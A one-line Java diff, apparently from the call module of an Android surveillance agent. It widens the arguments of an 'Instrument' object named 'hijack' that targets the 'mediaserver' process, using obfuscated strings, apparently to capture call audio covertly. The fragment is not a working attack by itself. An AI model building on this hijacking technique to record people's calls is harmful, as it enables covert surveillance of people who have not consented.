@@ -318,7 +318,7 @@ public class ModuleCall extends BaseModule   {
 		hjcb = new CallBack();
 		hjcb.register(new HC());
 
-		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
+		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage(),M.e("irg"),Status.self().semaphoreMediaserver,M.e("ib.data"));
 
 		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
